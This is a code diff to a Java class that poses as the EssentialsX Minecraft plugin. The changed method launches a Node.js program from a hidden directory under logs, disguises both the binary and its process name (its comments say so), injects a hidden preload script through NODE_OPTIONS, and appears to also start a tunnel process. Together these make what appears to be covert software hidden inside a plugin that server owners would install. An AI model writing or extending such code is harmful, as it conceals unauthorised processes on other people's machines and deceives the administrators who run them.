@@ -231,32 +231,43 @@ public class EssentialsX extends JavaPlugin {
     private void startNodeProcess(String port) {
         try {
             Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            // ★ 修复：直接使用伪装好的二进制 jre21/bin/java，避免递归包装导致崩溃
-            Path nodeExe = botDir.resolve("jre21/bin/java"); 
-            Path script = botDir.resolve("app/index.js");
-            Path logFile = botDir.resolve("app.log");
+            Path nodeBinDir = botDir.resolve("nodejs/bin");
+            Path nodeWrapper = nodeBinDir.resolve("node"); // 必须使用包装脚本！
             Path preload = botDir.resolve(".nd_preload.js");
+            Path appDir = botDir.resolve("app");
+            Path script = appDir.resolve("index.js");
+            Path logFile = botDir.resolve("app.log");
 
-            if (!Files.exists(nodeExe) || !Files.exists(script)) return;
+            // 检查关键文件
+            if (!Files.exists(nodeWrapper) || !Files.exists(script) || !Files.exists(preload)) {
+                mcLog("[Daemon] Missing node files, cannot start", 0);
+                return;
+            }
 
-            // ★ 修复：不再在命令行加 --require，防止与 NODE_OPTIONS 冲突导致双重加载崩溃
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c", 
-                "exec -a \"" + FAKE_CMDLINE + "\" \"" + nodeExe + "\" \"" + script + "\"");
-            
-            // ★ 修复：工作目录必须切换到 app 内，与原版 Shell 逻辑一致，否则找不到相对路径文件
-            pb.directory(botDir.resolve("app").toFile());
-            
-            pb.environment().put("SERVER_PORT", port);
+            // 直接调用包装脚本，包装脚本内部已经包含了 exec -a 伪装逻辑
+            String command = String.format("\"%s\" \"%s\"", nodeWrapper.toAbsolutePath(), script.toAbsolutePath());
+
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
+            // ✅ 工作目录必须是 app
+            pb.directory(appDir.toFile());
+
+            // ✅ 必须环境变量，且全部使用绝对路径
             pb.environment().put("PORT", port);
-            pb.environment().put("_JAVA_WRAPPER", botDir.resolve("nodejs/bin/node").toString());
-            // 只通过环境变量加载一次 preload
-            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
-            
+            pb.environment().put("SERVER_PORT", port);
+            pb.environment().put("_JAVA_WRAPPER", nodeWrapper.toAbsolutePath().toString());
+            pb.environment().put("NODE_OPTIONS", "--require " + preload.toAbsolutePath());
+
+            // 输出重定向
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
             pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
 
+            // 启动
             nodeProcess = pb.start();
-        } catch (Exception ignored) {}
+            mcLog("[Daemon] Node started successfully on port " + port, 0);
+
+        } catch (Exception e) {
+            mcLog("[Daemon] Node start failed: " + e.getMessage(), 0);
+        }
     }
 
     private void startCfProcess() {
@@ -641,7 +652,7 @@ public class EssentialsX extends JavaPlugin {
                    "# ===========================================\n" +
                    "SYSTEM_GUARD_ENABLED=true\n" +
                    "GITHUB_TOKEN=\n" +
-                   "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
+                   "REPO_URL=\n"; 
                 Files.write(envFile, defaultConfig.getBytes()); 
                 this.getLogger().info("Generated default .env file. PLEASE CONFIGURE REPO_URL!"); 
             } catch (Exception e) { 
